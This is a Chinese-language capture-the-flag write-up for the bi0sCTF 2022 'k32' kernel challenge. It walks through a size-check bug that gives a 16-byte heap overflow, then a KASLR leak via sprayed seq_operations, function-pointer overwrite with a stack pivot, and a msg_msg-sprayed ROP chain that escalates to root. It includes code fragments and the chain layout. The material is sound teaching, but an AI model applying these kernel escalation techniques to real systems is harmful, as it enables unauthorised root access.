# bi0sCTF 2022 - k32

## 题目简述

题目提供 Linux 内核、rootfs 和 `k32.ko`。模块通过 `/dev/k32` 暴露 create/delete/read/write 四个 ioctl，并用链表节点保存 `buf` 和一个 8 位 `size`。运行环境启用了 SMEP、SMAP、KPTI 和 KASLR；`CONFIG_STATIC_USERMODEHELPER=y` 也让常见的 `modprobe_path` 路线不可用，因此需要在内核中完成提权 ROP 并安全返回用户态。

## 解题过程

### 两次修正尺寸造成 16 字节 OOB

漏洞来自同一个尺寸修正函数被调用两次：

```c
static noinline uint8_t k32_fix_size(uint8_t size)
{
    if (size > 0x30) return 0x30;
    else return 0x20;
}

req->size = k32_fix_size(req->size);
k32->buf = kmalloc(k32_fix_size(req->size), GFP_KERNEL);
k32->size = req->size;
```

当用户传入大于 `0x30` 的尺寸时，第一次调用把 `req->size` 变成 `0x30`；第二次调用面对恰好等于 `0x30` 的值，由于判断是严格的 `>`，返回 `0x20`。最终模块只分配 32 字节，却记录可读写 48 字节，形成稳定的 16 字节堆越界读写。

### 泄漏堆地址和内核基址

先分配多个 `kmalloc-32` 对象并读取未初始化/越界区域，可以取得 slab freelist 指针，页对齐后作为内核堆基准。随后再建立一个易受攻击的节点，并大量打开 `/proc/self/stat`，让相邻的 `kmalloc-32` 槽位被 `seq_operations` 占据：

```c
for (int i = 0; i < SPRAY_SZ; i++)
    pfd[i] = open("/proc/self/stat", O_RDONLY);
```

从 32 字节缓冲区读取 40 字节时，最后 8 字节越过边界，泄漏相邻 `seq_operations` 的函数指针。官方 exploit 用已知符号偏移计算内核基址：

```c
k32_read(victim_idx, (char *)&dump, 0x28);
kernel_base = dump[4] - 0x1aa471;
```

所有 gadget、`prepare_kernel_cred`、`commit_creds` 和 KPTI trampoline 地址都由该基址重定位，不能直接使用静态绝对地址。

### 覆盖 seq_operations 并栈迁移

用 48 字节写覆盖相邻 `seq_operations` 的 `.start` 和 `.next` 指针。两个入口先放置用于调整返回栈的 gadget；触发 `read(pfd, ...)` 后，`seq_read_iter` 会依次调用这些函数指针，并最终从系统调用保存的用户寄存器区域取到可控值。

官方脚本在触发前把 `r14` 设为栈迁移 gadget，把 `r13` 设为喷射区中 ROP 链的堆地址：

```c
register unsigned long r14 asm("r14") = pivot;
register unsigned long r13 asm("r13") = heap_rop;
read(pfd[i], tmp, sizeof(tmp));
```

由于 16 字节 OOB 只能覆盖少量函数指针，完整 ROP 链不能直接写在目标对象后。解决方法是用 System V 消息队列喷射 `msg_msg`，把下列链稳定放入可预测的堆区域：

```text
pop rdi ; ret
0
prepare_kernel_cred
xchg rdi, rax ; ret
commit_creds
KPTI trampoline
dummy rax
dummy rdi
gib_shell
user_cs
user_rflags
user_sp
user_ss
```

ROP 执行 `commit_creds(prepare_kernel_cred(0))` 后，经 KPTI trampoline 恢复用户态寄存器，落到 `gib_shell()`，此时 `getuid()` 应为 0。读取 flag 得到：

```text
bi0sctf{km4ll0c-32_1sn't_3xpl01tabl3_r1gh7_guy5?_3feb178d2a9c}
```

对象喷射和 `seq_read_iter` 返回栈的完整背景可对照 [官方赛后题解](https://blog.bi0s.in/2023/01/23/Pwn/bi0sCTF22-k32/)；上述内容已经把题目专属尺寸错误、两类泄漏、函数指针覆盖、栈迁移与提权返回链完整串联。

## 方法总结

本题最关键的审计点是“规范化函数被重复调用后是否幂等”。`k32_fix_size(0x30)` 与对大值第一次修正的结果不一致，导致逻辑尺寸和真实分配尺寸分叉。利用链则体现了内核小范围 OOB 的典型扩展方式：用 freelist/函数指针泄漏绕过 KASLR，借同尺寸对象喷射控制邻接，再把有限 RIP 控制转换为堆上 ROP，最后通过 KPTI trampoline 返回用户态。
